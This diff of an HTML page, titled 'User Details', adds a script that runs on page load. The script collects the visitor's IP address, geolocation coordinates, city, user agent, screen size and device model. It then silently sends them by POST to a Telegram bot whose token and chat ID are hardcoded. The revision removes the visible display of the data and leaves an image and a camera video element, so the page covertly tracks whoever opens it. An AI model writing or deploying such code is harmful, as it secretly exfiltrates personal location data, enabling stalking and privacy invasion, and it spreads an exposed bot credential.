@@ -1,65 +1,59 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User IP Address</title>
+  <title>User Details</title>
   <link rel="stylesheet" href="style.css">
   <script src="main.js"></script>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-</script>
-<script type='text/javascript' src="//wurfl.io/wurfl.js"></script>
-<script>
-
-$.getJSON("https://api.ipify.org?format=json", function(data) {
-    var ipAddress = data.ip;
-    $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(locationData) {
-        var loc = locationData.latitude + "," + locationData.longitude;
-        var city = locationData.city;
-        var ip = locationData.ip;
-        $("#loc").text("Location: " + loc);
-        $("#city").text("City: " + city);
-        $("#ip").text("ip: " + ip);
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script type='text/javascript' src="//wurfl.io/wurfl.js"></script>
+  <script>
 
 
-        const model = navigator.userAgent;
-        console.log(model);
-        const width = screen.width;
-        const height = screen.height;
-        console.log(width + " " + height);
-        const userAgent = navigator.userAgent;
-        console.log(userAgent);
-        const modelName = WURFL.complete_device_name
-        console.log(modelName)
+    $(document).ready(function(){
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+            var ipAddress = data.ip;
+            $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(locationData) {
+                var loc = locationData.latitude + "," + locationData.longitude;
+                var city = locationData.city;
+                var ip = locationData.ip;
 
+                $("#loc").text("Location: " + loc);
+                $("#city").text("City: " + city);
+                $("#ip").text("ip: " + ip);
 
-        var telegramApiUrl = "https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw/sendMessage";
-        var chatId = "1494753646";
-        var message = "New location: " + loc + ", " + city + ", IP: " + ip + "\n" + model + "\n"  + width + " " + height + "\n" + userAgent + "\n" + modelName;
+                const model = navigator.userAgent;
+                const width = screen.width;
+                const height = screen.height;
+                const userAgent = navigator.userAgent;
+                const modelName = WURFL.complete_device_name;
 
+                var message = "New location: " + loc + ", " + city + ", IP: " + ip + "\n" + model + "\n"  + width + " " + height + "\n" + userAgent + "\n" + modelName;
 
-        fetch(telegramApiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ chat_id: chatId, text: message}),
-        })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error:', error));
+                var apiBot = "https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw";
+                var telegramApiUrl = apiBot + "/sendMessage";
+                var chatId = "1494753646";
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ chat_id: chatId, text: message}),
+                })
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.error('Error:', error));
+            });
+        });
     });
-});
 
-</script>
+  </script>
 </head>
 <body>
-    <p id="loc"></p></p>
-    <p id="ip"></p></p>
-    <p id="city"></p></p>
-
-    <video id="cameraFeed" autoplay playsinline></video>
-
-
+    <img src="siba.png" >
+    <video id="cameraFeed" autoplay></video>
 </body>
 </html>
